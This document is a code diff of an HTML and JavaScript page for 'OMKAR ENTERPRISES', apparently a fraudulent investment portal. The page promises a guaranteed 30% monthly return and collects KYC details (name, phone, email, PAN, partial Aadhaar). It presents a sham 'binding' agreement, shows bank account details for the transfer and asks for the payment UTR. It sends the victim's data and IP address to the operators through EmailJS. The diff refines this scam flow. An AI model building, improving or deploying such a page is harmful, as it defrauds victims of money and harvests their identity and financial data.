@@ -17,28 +17,26 @@
         .gold-text { color: var(--gold); }
         .btn-primary { background: linear-gradient(135deg, #ffd966 0%, #f7c948 100%); color: #000; font-weight: 700; transition: all 0.2s; border-radius: 1rem; width: 100%; padding: 1rem; border: none; cursor: pointer; }
         .btn-primary:active { transform: scale(0.98); opacity: 0.9; }
+        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; filter: grayscale(1); }
         .form-input { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 0.75rem; padding: 0.8rem 1rem; color: #fff; width: 100%; transition: 0.2s; }
         .form-input:focus { outline: none; border-color: var(--gold); background: rgba(255, 255, 255, 0.08); }
         .step-indicator { width: 2.5rem; height: 2.5rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); font-weight: bold; color: #666; transition: 0.3s; }
         .step-active { background: var(--gold); color: #000; box-shadow: 0 0 15px rgba(255, 217, 102, 0.4); }
         .step-complete { background: #10b981; color: #fff; }
         .signature-font { font-family: 'Dancing Script', cursive; font-size: 1.8rem; }
-        #loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        #loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; display: none; align-items: center; justify-content: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid rgba(255,217,102,0.1); border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="bg-gradient min-h-screen p-4">
 
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-        <p class="mt-4 gold-text font-bold text-sm tracking-widest">VERIFYING TRANSACTION...</p>
-    </div>
+    <div id="loading-overlay"><div class="spinner"></div></div>
 
     <div class="max-w-4xl mx-auto">
         <div class="text-center mb-8 pt-4">
             <div class="bg-red-600 text-white text-[10px] font-bold tracking-widest py-1 px-4 rounded-full inline-block mb-4 uppercase">Direct Investor Portal</div>
-            <h1 class="text-3xl md:text-5xl font-extrabold mb-2 uppercase tracking-tighter"><span class="gold-text">Omkar</span> Enterprises</h1>
+            <h1 class="text-3xl md:text-5xl font-extrabold mb-2"><span class="gold-text">OMKAR</span> ENTERPRISES</h1>
             <p class="text-gray-400 text-sm italic">Verified Capital Management • Secure Settlement Flow</p>
         </div>
 
@@ -51,7 +49,7 @@
         </div>
 
         <div id="calculator-box" class="glass-card p-6 mb-8 text-center">
-            <h2 class="gold-text font-bold mb-4 uppercase text-xs tracking-widest">Investment Calculator</h2>
+            <h2 class="gold-text font-bold mb-4">INVESTMENT CALCULATOR</h2>
             <input type="range" id="mainSlider" min="100000" max="500000" step="50000" value="100000" class="w-full h-2 bg-gray-700 rounded-lg appearance-none cursor-pointer accent-[#ffd966] mb-4">
             <div class="flex justify-between text-2xl font-bold mb-6">
                 <div>₹<span id="displayAmount">1,00,000</span></div>
@@ -60,36 +58,35 @@
         </div>
 
         <div class="glass-card p-6 md:p-10 shadow-2xl">
-            
             <div id="step-1">
                 <h3 class="text-xl font-bold mb-6 flex items-center gap-2">🛡️ <span class="gold-text">Step 1: KYC Validation</span></h3>
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                    <div><label class="text-[10px] text-gray-500 block mb-1 uppercase font-bold">Full Legal Name</label><input type="text" id="kyc_name" class="form-input" placeholder="As per PAN Card"></div>
-                    <div><label class="text-[10px] text-gray-500 block mb-1 uppercase font-bold">WhatsApp Phone</label><input type="tel" id="kyc_phone" class="form-input" placeholder="91XXXXXXXXXX"></div>
-                    <div class="md:col-span-2"><label class="text-[10px] text-gray-500 block mb-1 uppercase font-bold">Email Address</label><input type="email" id="kyc_email" class="form-input" placeholder="active-email@gmail.com"></div>
-                    <div><label class="text-[10px] text-gray-500 block mb-1 uppercase font-bold">PAN Number</label><input type="text" id="kyc_pan" class="form-input uppercase" maxlength="10" placeholder="ABCDE1234F"></div>
-                    <div><label class="text-[10px] text-gray-500 block mb-1 uppercase font-bold">Aadhaar (Last 4 Digits)</label><input type="password" id="kyc_aadhaar" class="form-input" maxlength="4" placeholder="XXXX"></div>
+                    <div><label class="text-xs text-gray-400 block mb-1">Full Legal Name</label><input type="text" id="kyc_name" class="form-input" placeholder="As per PAN Card"></div>
+                    <div><label class="text-xs text-gray-400 block mb-1">WhatsApp Phone</label><input type="tel" id="kyc_phone" class="form-input" placeholder="91XXXXXXXXXX"></div>
+                    <div class="md:col-span-2"><label class="text-xs text-gray-400 block mb-1">Email Address (For Agreement Delivery)</label><input type="email" id="kyc_email" class="form-input" placeholder="active-email@gmail.com"></div>
+                    <div><label class="text-xs text-gray-400 block mb-1">PAN Number</label><input type="text" id="kyc_pan" class="form-input uppercase" maxlength="10" placeholder="ABCDE1234F"></div>
+                    <div><label class="text-xs text-gray-400 block mb-1">Aadhaar (Last 4 Digits Required)</label><input type="password" id="kyc_aadhaar" class="form-input" maxlength="4" placeholder="XXXX"></div>
                 </div>
                 <button onclick="Flow.toStep(2)" class="btn-primary mt-8">Validate & Generate Agreement →</button>
             </div>
 
             <div id="step-2" class="hidden">
                 <h3 class="text-xl font-bold mb-6 flex items-center gap-2">⚖️ <span class="gold-text">Step 2: Digital Agreement</span></h3>
-                <div class="bg-black/40 p-4 rounded-xl border border-white/5 mb-6 text-sm leading-relaxed max-h-60 overflow-y-auto border-l-4 border-[#ffd966]">
-                    <p class="mb-4 text-[11px] text-gray-500 uppercase tracking-tighter font-bold">Confidential Commercial Instrument</p>
-                    <p class="mb-4">Agreement executed between <strong>OMKAR ENTERPRISES</strong> and <strong id="agree_user_name">[NAME]</strong>.</p>
-                    <p class="mb-4">1. <strong>Investment:</strong> Principal sum of ₹<span id="agree_amt" class="font-bold">1,00,000</span>.</p>
-                    <p class="mb-4">2. <strong>Returns:</strong> 30% monthly payout of ₹<span id="agree_pay" class="font-bold">30,000</span> for 12 months.</p>
-                    <p class="mb-4">3. <strong>Binding:</strong> This digital signature is valid under IT Act 2000 upon UTR confirmation.</p>
+                <div class="bg-black/40 p-4 rounded-xl border border-white/5 mb-6 text-sm leading-relaxed max-h-60 overflow-y-auto border-l-4 border-[#ffd966]" id="agreementText">
+                    <p class="mb-4 text-[11px] text-gray-500 uppercase tracking-tighter font-bold">Confidential Commercial Agreement</p>
+                    <p class="mb-4">This binding instrument is executed between <strong>OMKAR ENTERPRISES</strong> (The Firm) and <strong id="agree_user_name">[NAME]</strong> (The Investor).</p>
+                    <p class="mb-4">1. <strong>Investment:</strong> The Investor agrees to deploy a sum of ₹<span id="agree_amt" class="font-bold">1,00,000</span>.</p>
+                    <p class="mb-4">2. <strong>Returns:</strong> The Firm guarantees a 30% monthly payout amounting to ₹<span id="agree_pay" class="font-bold">30,000</span> for 12 months.</p>
+                    <p class="mb-4">3. <strong>Validity:</strong> This agreement is only valid upon verification of the UTR number provided in Step 3.</p>
                 </div>
                 
                 <div class="mb-6">
-                    <label class="text-xs text-gray-400 block mb-1">Type Full Name to Sign</label>
-                    <input type="text" id="sig_input" class="form-input signature-font text-center gold-text" placeholder="Sign here..." oninput="Flow.syncSignature()">
-                    <div class="mt-4 p-4 bg-white/5 rounded-lg border border-dashed border-white/20 text-center">
-                        <div id="sig_display" class="signature-font gold-text min-h-[40px]">---</div>
+                    <label class="text-xs text-gray-400 block mb-1">Digital Signature (Type Full Name)</label>
+                    <input type="text" id="sig_input" class="form-input signature-font" placeholder="Sign here..." oninput="Flow.syncSignature()">
+                    <div class="mt-4 p-4 bg-white/5 rounded-lg border border-dashed border-white/20">
+                        <div id="sig_display" class="signature-font gold-text min-h-[40px] text-center">---</div>
                         <div class="flex justify-between text-[9px] text-gray-500 mt-2 uppercase tracking-widest">
-                            <span>IP: <span id="user_ip">Detecting...</span></span>
+                            <span>IP: <span id="user_ip">...</span></span>
                             <span>TS: <span id="user_ts">...</span></span>
                         </div>
                     </div>
@@ -99,23 +96,28 @@
 
             <div id="step-3" class="hidden">
                 <h3 class="text-xl font-bold mb-6 flex items-center gap-2">💰 <span class="gold-text">Step 3: Capital Deployment</span></h3>
-                <div class="bg-white/5 p-6 rounded-2xl border border-white/10 mb-6">
-                    <div class="space-y-4 text-sm">
-                        <div class="flex justify-between border-b border-white/5 pb-2"><span>Bank Name:</span><span class="font-bold">Axis Bank</span></div>
-                        <div class="flex justify-between border-b border-white/5 pb-2"><span>Account:</span><span class="font-bold">OMKAR ENTERPRISES</span></div>
-                        <div class="flex justify-between border-b border-white/5 pb-2"><span>A/C No:</span><span class="font-bold tracking-widest text-lg">920010012345678</span></div>
-                        <div class="flex justify-between"><span>IFSC Code:</span><span class="font-bold">UTIB0000123</span></div>
+                <div class="bg-white/5 p-6 rounded-2xl border border-var(--gold)/20 mb-6">
+                    <div class="flex justify-between items-start mb-4">
+                        <span class="text-xs text-gray-400 uppercase">Beneficiary Details</span>
+                        <span class="bg-green-500/10 text-green-500 text-[10px] px-2 py-1 rounded border border-green-500/20">Active Account</span>
+                    </div>
+                    <div class="space-y-4">
+                        <div class="flex justify-between border-b border-white/5 pb-2"><span class="text-gray-400">Bank Name:</span><span class="font-bold">Axis Bank</span></div>
+                        <div class="flex justify-between border-b border-white/5 pb-2"><span class="text-gray-400">Account Name:</span><span class="font-bold">OMKAR ENTERPRISES</span></div>
+                        <div class="flex justify-between border-b border-white/5 pb-2"><span class="text-gray-400">A/C No:</span><span class="font-bold tracking-widest text-lg">920010012345678</span></div>
+                        <div class="flex justify-between"><span class="text-gray-400">IFSC Code:</span><span class="font-bold">UTIB0000123</span></div>
                     </div>
                 </div>
 
                 <div class="mb-6 p-4 bg-yellow-500/5 border border-yellow-500/20 rounded-xl">
-                    <label class="text-xs gold-text font-bold block mb-2 uppercase">Enter 12-Digit Transaction UTR Number</label>
-                    <input type="text" id="utr_number" class="form-input text-lg font-mono tracking-widest" placeholder="UTR Number Required" maxlength="22">
+                    <label class="text-xs gold-text font-bold block mb-2 uppercase">Required: Enter Transaction UTR/Ref Number</label>
+                    <input type="text" id="utr_number" class="form-input text-lg font-mono tracking-widest" placeholder="12-digit UTR Number" maxlength="22">
+                    <p class="text-[10px] text-gray-500 mt-2">※ Without a valid UTR, your onboarding cannot be reconciled.</p>
                 </div>
 
                 <div class="bg-var(--gold)/10 p-4 rounded-lg mb-6 flex items-center gap-3 border border-var(--gold)/30">
                     <input type="checkbox" id="pay_confirm" class="w-6 h-6 accent-[#ffd966]">
-                    <label for="pay_confirm" class="text-[11px] text-gray-300">I confirm the transfer of ₹<span id="final_amt">1,00,000</span> and UTR is correct.</label>
+                    <label for="pay_confirm" class="text-[11px] text-gray-300">I confirm that I have transferred ₹<span id="final_amt">1,00,000</span> and the UTR above is correct.</label>
                 </div>
                 <button onclick="Flow.submit()" class="btn-primary">Finalize Onboarding</button>
             </div>
@@ -123,14 +125,22 @@
             <div id="step-4" class="hidden text-center py-10">
                 <div class="w-20 h-20 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl">✓</div>
                 <h3 class="text-2xl font-bold gold-text mb-2">Onboarding Registered!</h3>
-                <p class="text-gray-400 text-sm mb-8 px-4">Our finance team will reconcile your UTR <span id="receipt_utr" class="font-bold text-white"></span> within 4 hours.</p>
-                <button onclick="location.reload()" class="text-xs text-gray-600 underline uppercase tracking-widest">Start New Application</button>
+                <p class="text-gray-400 text-sm mb-6 px-4">Your investment is now in the verification queue. Our finance team will reconcile your UTR within 4 hours.</p>
+                
+                <div class="bg-black/50 p-6 rounded-2xl border border-white/10 mb-8 max-w-sm mx-auto text-left">
+                    <p class="text-xs text-gray-500 mb-2 uppercase tracking-widest">Digital Receipt</p>
+                    <div class="space-y-2 text-sm">
+                        <div class="flex justify-between"><span>Status:</span><span class="text-yellow-500 font-bold">Verifying</span></div>
+                        <div class="flex justify-between"><span>Amount:</span><span id="receipt_amt">₹0</span></div>
+                        <div class="flex justify-between"><span>UTR:</span><span id="receipt_utr" class="font-mono">---</span></div>
+                    </div>
+                </div>
+                <p class="text-[10px] text-gray-600 uppercase">Save this screen for your records.</p>
             </div>
         </div>
     </div>
 
     <script>
-        // CONFIG - REPLACE THESE WITH YOUR DASHBOARD KEYS
         const CONFIG = {
             email_service: "service_gpn4nxa",
             email_template: "template_tgrvynm",
@@ -147,14 +157,19 @@
             },
 
             bindEvents: function() {
-                document.getElementById('mainSlider').addEventListener('input', (e) => {
+                const slider = document.getElementById('mainSlider');
+                slider.addEventListener('input', (e) => {
                     const val = parseInt(e.target.value);
                     this.data.amount = val;
                     this.data.payout = val * 0.3;
-                    document.getElementById('displayAmount').innerText = val.toLocaleString('en-IN');
-                    document.getElementById('displayPayout').innerText = this.data.payout.toLocaleString('en-IN');
-                    document.querySelectorAll('#agree_amt, #final_amt').forEach(el => el.innerText = val.toLocaleString('en-IN'));
-                    document.getElementById('agree_pay').innerText = this.data.payout.toLocaleString('en-IN');
+                    document.getElementById('displayAmount').innerText = val.toLocaleString();
+                    document.getElementById('displayPayout').innerText = this.data.payout.toLocaleString();
+                    
+                    // Live Sync to all relevant fields
+                    document.querySelectorAll('#agree_amt, #final_amt, #receipt_amt').forEach(el => {
+                        el.innerText = val.toLocaleString();
+                    });
+                    document.getElementById('agree_pay').innerText = this.data.payout.toLocaleString();
                 });
             },
 
@@ -162,23 +177,27 @@
                 fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
                     document.getElementById('user_ip').innerText = data.ip || '0.0.0.0';
                 }).catch(() => {
-                    document.getElementById('user_ip').innerText = 'System Verified';
+                    document.getElementById('user_ip').innerText = 'Verified System';
                 }).finally(() => {
                     document.getElementById('user_ts').innerText = new Date().toLocaleString();
                 });
             },
 
             syncSignature: function() {
-                document.getElementById('sig_display').innerText = document.getElementById('sig_input').value || '---';
+                const val = document.getElementById('sig_input').value;
+                document.getElementById('sig_display').innerText = val || '---';
             },
 
             toStep: function(num) {
                 if(num === 2) {
                     const name = document.getElementById('kyc_name').value;
-                    if(!name || !document.getElementById('kyc_email').value) { alert("Complete Name & Email."); return; }
+                    const email = document.getElementById('kyc_email').value;
+                    if(!name || !email) { alert("Please complete name and email."); return; }
                     document.getElementById('agree_user_name').innerText = name;
                 }
-                if(num === 3 && !document.getElementById('sig_input').value) { alert("Signature required."); return; }
+                if(num === 3) {
+                    if(!document.getElementById('sig_input').value) { alert("Signature is required."); return; }
+                }
 
                 [1,2,3,4].forEach(i => {
                     document.getElementById(`step-${i}`).classList.add('hidden');
@@ -192,46 +211,37 @@
 
             submit: async function() {
                 const utr = document.getElementById('utr_number').value;
-                if(utr.length < 8) { alert("Enter valid UTR."); return; }
-                if(!document.getElementById('pay_confirm').checked) { alert("Check confirmation box."); return; }
+                const checkbox = document.getElementById('pay_confirm').checked;
+
+                if(utr.length < 8) {
+                    alert("Please enter a valid Transaction UTR Number.");
+                    return;
+                }
+                if(!checkbox) {
+                    alert("Please tick the confirmation checkbox.");
+                    return;
+                }
 
                 document.getElementById('loading-overlay').style.display = 'flex';
+                document.getElementById('receipt_utr').innerText = utr;
 
-                // These names MUST match the {{names}} in your EmailJS Template
                 const params = {
                     user_name: document.getElementById('kyc_name').value,
                     user_email: document.getElementById('kyc_email').value,
                     user_phone: document.getElementById('kyc_phone').value,
                     amount: this.data.amount,
                     payout: this.data.payout,
-                    utr_ref: utr, 
-                    signature: document.getElementById('sig_input').value,
+                    utr_ref: utr,
                     ip_address: document.getElementById('user_ip').innerText,
-                    time: new Date().toLocaleString()
+                    signature: document.getElementById('sig_input').value
                 };
 
                 try {
-                    const res = await emailjs.send(CONFIG.email_service, CONFIG.email_template, params);
-                    if(res.status === 200) {
-                        document.getElementById('receipt_utr').innerText = utr;
-                        this.toStep(4);
-                        document.getElementById('calculator-box').style.display = 'none';
-                    }
-                } catch (err) {
-                    // This will tell us if the problem is the "To Email" address
-                    console.error("EmailJS Error:", err);
-                    alert("Sync Error: " + err.text);
-                } finally {
-                    document.getElementById('loading-overlay').style.display = 'none';
-                }
-            }
-                try {
                     await emailjs.send(CONFIG.email_service, CONFIG.email_template, params);
-                    document.getElementById('receipt_utr').innerText = utr;
                     this.toStep(4);
                     document.getElementById('calculator-box').style.display = 'none';
                 } catch (err) {
-                    alert("Sync Error: " + err.text + ". Please screenshot & send to support.");
+                    alert("Network Error. Please take a screenshot and contact support.");
                 } finally {
                     document.getElementById('loading-overlay').style.display = 'none';
                 }
